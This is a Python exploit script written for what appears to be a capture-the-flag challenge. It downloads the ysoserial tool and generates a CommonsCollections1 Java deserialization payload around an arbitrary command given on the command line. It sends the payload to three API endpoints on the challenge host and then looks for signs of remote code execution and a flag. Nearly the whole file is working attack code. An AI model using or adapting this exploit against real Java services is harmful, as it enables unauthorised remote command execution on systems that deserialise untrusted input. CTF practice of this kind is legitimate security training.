#!/usr/bin/env python3
"""
Serial Killer - Python Exploitation Script
Generates and sends Java deserialization payloads to vulnerable endpoints
"""

import subprocess
import base64
import requests
import json
import sys
import os

# Configuration
TARGET_URL = "https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al"
YSOSERIAL_JAR = "/tmp/ysoserial.jar"
YSOSERIAL_URL = "https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar"

# ANSI color codes
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
NC = '\033[0m'  # No Color

def print_banner():
    """Print script banner"""
    print(f"{BLUE}{'='*60}")
    print("  Serial Killer - Java Deserialization Exploit")
    print(f"{'='*60}{NC}\n")

def download_ysoserial():
    """Download ysoserial if not present"""
    if os.path.exists(YSOSERIAL_JAR):
        print(f"{GREEN}[+] ysoserial already present{NC}")
        return True
    
    print(f"{YELLOW}[*] Downloading ysoserial...{NC}")
    try:
        import urllib.request
        urllib.request.urlretrieve(YSOSERIAL_URL, YSOSERIAL_JAR)
        print(f"{GREEN}[+] ysoserial downloaded successfully{NC}")
        return True
    except Exception as e:
        print(f"{RED}[-] Failed to download ysoserial: {e}{NC}")
        return False

def generate_payload(command="id", gadget="CommonsCollections1"):
    """
    Generate malicious Java deserialization payload using ysoserial
    
    Args:
        command: System command to execute
        gadget: Gadget chain to use (default: CommonsCollections1)
    
    Returns:
        Base64-encoded payload or None on failure
    """
    print(f"{YELLOW}[*] Generating {gadget} payload for command: '{command}'{NC}")
    
    try:
        # Run ysoserial with Java module opens for compatibility
        result = subprocess.run([
            'java',
            '--add-opens', 'java.base/sun.reflect.annotation=ALL-UNNAMED',
            '--add-opens', 'java.base/java.lang=ALL-UNNAMED',
            '-jar', YSOSERIAL_JAR,
            gadget,
            command
        ], capture_output=True, check=False)
        
        if result.returncode != 0:
            print(f"{RED}[-] Failed to generate payload{NC}")
            print(f"Error: {result.stderr.decode()}")
            return None
        
        # Base64 encode the payload
        payload = base64.b64encode(result.stdout).decode('utf-8')
        print(f"{GREEN}[+] Payload generated ({len(payload)} bytes){NC}")
        return payload
        
    except Exception as e:
        print(f"{RED}[-] Exception generating payload: {e}{NC}")
        return None

def send_payload(endpoint, payload):
    """
    Send payload to a specific endpoint
    
    Args:
        endpoint: API endpoint path (e.g., /api/session)
        payload: Base64-encoded malicious payload
    
    Returns:
        Response JSON or None
    """
    url = f"{TARGET_URL}{endpoint}"
    print(f"\n{YELLOW}[*] Testing endpoint: {endpoint}{NC}")
    
    try:
        response = requests.post(
            url,
            json={"data": payload},
            headers={"Content-Type": "application/json"},
            timeout=15
        )
        
        return response.json()
        
    except requests.exceptions.Timeout:
        print(f"{RED}[-] Request timed out{NC}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"{RED}[-] Request failed: {e}{NC}")
        return None
    except json.JSONDecodeError:
        print(f"{RED}[-] Invalid JSON response{NC}")
        return None

def extract_flag(response):
    """Extract flag from response if present"""
    if not response:
        return None
    
    if "flag" in response:
        return response["flag"]
    
    # Search for flag pattern in all values
    for value in response.values():
        if isinstance(value, str) and value.startswith("CSC26{"):
            return value
    
    return None

def main():
    """Main exploitation routine"""
    print_banner()
    
    # Download ysoserial if needed
    if not download_ysoserial():
        sys.exit(1)
    
    print()
    
    # Generate payload
    command = sys.argv[1] if len(sys.argv) > 1 else "id"
    payload = generate_payload(command)
    
    if not payload:
        sys.exit(1)
    
    # Test all endpoints
    endpoints = ['/api/session', '/api/config', '/api/cache']
    flags_found = set()
    
    for endpoint in endpoints:
        response = send_payload(endpoint, payload)
        
        if response:
            # Pretty print response
            print(f"{BLUE}Response:{NC}")
            print(json.dumps(response, indent=2))
            
            # Check for flag
            flag = extract_flag(response)
            if flag:
                flags_found.add(flag)
                print(f"\n{GREEN}[+] FLAG FOUND: {flag}{NC}")
            
            # Check for RCE confirmation
            if response.get('rce_achieved') == True:
                print(f"{GREEN}[+] RCE Achieved!{NC}")
                if 'output' in response:
                    print(f"Command output: {response['output']}")
        else:
            print(f"{RED}[-] No valid response{NC}")
    
    # Summary
    print(f"\n{BLUE}{'='*60}")
    print("  Summary")
    print(f"{'='*60}{NC}")
    
    if flags_found:
        print(f"{GREEN}[+] Exploitation successful!{NC}")
        for flag in flags_found:
            print(f"    Flag: {flag}")
    else:
        print(f"{RED}[-] No flags found{NC}")
    
    print()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted by user{NC}")
        sys.exit(0)
